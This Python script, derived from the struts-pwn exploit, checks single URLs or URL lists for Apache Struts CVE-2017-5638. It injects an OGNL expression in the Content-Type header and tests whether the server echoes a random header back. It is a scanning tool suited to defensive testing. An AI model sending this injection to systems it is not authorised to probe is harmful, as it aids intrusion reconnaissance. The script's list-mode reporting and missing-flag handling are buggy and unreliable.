#!/usr/bin/env python3
# coding=utf-8
# *****************************************************
# struts-check: Check for Apache Struts Vulnerability CVE-2017-5638
# based on code from https://github.com/mazen160/struts-pwn
# struts-pwn: Apache Struts CVE-2017-5638 Exploit
# Author: Mazin Ahmed <Mazin AT MazinAhmed DOT net>
# Original code is based on:
# https://www.exploit-db.com/exploits/41570/
# https://www.seebug.org/vuldb/ssvid-92746
# *****************************************************
import sys
import random
import requests
import argparse

try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except:
    pass

if len(sys.argv) <= 1:
    print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
    print('[*] struts-check ')
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs.",
		    action='store')	  
parser.add_argument("--check",
                    dest="do_check",
                    help="Check if a target is vulnerable",
                    action='store_true')
args = parser.parse_args()
url = args.url if args.url else None
usedlist = args.usedlist if args.usedlist else None
do_check = args.do_check if args.do_check else None

def url_prepare(url):
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')
    if ('://' not in url):
        url = str('https') + str('://') + str(url)
    return(url)

	
def check(url):
    url = url_prepare(url)
    print('\n[*] URL: %s' % (url))

    random_string = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(7))

    payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']."
    payload += "addHeader('%s','%s')}.multipart/form-data" % (random_string, random_string)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
        'Content-Type': str(payload),
        'Accept': '*/*'
    }

    timeout = 3
    try:
        resp = requests.get(url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)
        if ((random_string in resp.headers.keys()) and (resp.headers[random_string] == random_string)):
            result = True
        else:
            result = False
    except Exception as e:
        print("EXCEPTION::::--> " + str(e))
        result = False
    return(result)

def main(url=url, usedlist=usedlist, do_check=do_check):
	if url:
		if do_check:
			result = check(url)  # Only check for existence of Vulnerablity
			output = '[*] Status: '
			if result is True:
				output += 'Vulnerable!'
			else:
				output += 'Not Affected.'
		print(output)
			  
	if usedlist:
		URLs_List = []
		try:
			f_file = open(str(usedlist), 'r')
			URLs_List = f_file.read().replace('\r', '').split('\n')
			try:
				URLs_List.remove('')
			except ValueError:
				pass
				f_file.close()
		except:
			print('Error: There was an error in reading list file.')
			exit(1)
		for url in URLs_List:
			if do_check:
				result = check(url)  # Only check for existence of Vulnerablity
				output = '[*] Status: '
				if result is True:
					output += 'Vulnerable!'
				else:
					output += 'Not Affected.'
		print(output)

	print('[%] Done.')
	  
if __name__ == '__main__':
	try:
		main(url=url, usedlist=usedlist, do_check=do_check)
	except KeyboardInterrupt:
		print('\nKeyboardInterrupt Detected.')
		print('Exiting...')
		exit(0)
